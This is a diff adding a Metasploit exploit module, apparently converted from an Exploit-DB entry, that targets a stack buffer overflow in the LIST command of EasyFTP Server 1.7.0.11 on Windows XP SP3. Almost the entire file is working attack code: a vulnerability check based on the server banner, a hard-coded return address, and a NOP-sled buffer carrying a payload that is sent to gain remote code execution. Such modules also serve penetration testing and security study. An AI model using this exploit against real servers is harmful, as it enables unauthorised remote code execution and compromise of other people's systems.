@@ -1,0 +1,81 @@
+##
+# EDB-ID: 14400
+# Date : July 5, 2010
+# Discovered by : Karn Ganeshen
+# Version : 1.7.0.11
+# Tested on : Windows XP SP3 Version 2002
+# MFR  & VAS TEAM : just testing howto convert exploits to metasploit modules.
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::Ftp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'EasyFTP Server <= 1.7.0.11 LIST Command Stack Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11.
+					credit goes to Karn Ganeshan.	
+			},
+			'Author'         =>
+				[
+					'Karn Ganeshan <karnganeshan [at] gmail.com>', # original version
+					'MFR' # convert to metasploit format.
+				],
+			'License'        => MSF_LICENSE,
+			'Version'        => 'Version: 1',
+			'References'     =>
+				[
+					[ 'EDB', '14400' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'thread'
+				},
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'Space'    => 268,
+					'BadChars' => "\x00\x0a\x0d\x2f\x5c", 
+					'DisableNops' => false
+				},
+			'Platform'	 => 'win',
+			'Targets'        =>
+				[
+					[ 'Windows XP SP3 - Version 2002',   { 'Ret' => 0x7e49732b } ],
+				],
+			'DisclosureDate' => 'July 5 2010',
+			'DefaultTarget' => 0))
+	end
+
+	def check
+		connect
+		disconnect
+
+		if (banner =~ /BigFoolCat/)
+			return Exploit::CheckCode::Vulnerable
+		end
+			return Exploit::CheckCode::Safe
+	end
+
+	def exploit
+		connect_login
+
+		buf = ''
+		buf << make_nops(268 - payload.encoded.length - 4)
+		print_status("Adding the payload...")
+		buf << payload.encoded
+		buf << [target.ret].pack('V')
+
+		print_status("Sending exploit buffer...")
+		send_cmd( ['LIST', buf] , false) 
+
+		handler
+		disconnect
+	end
+
+end
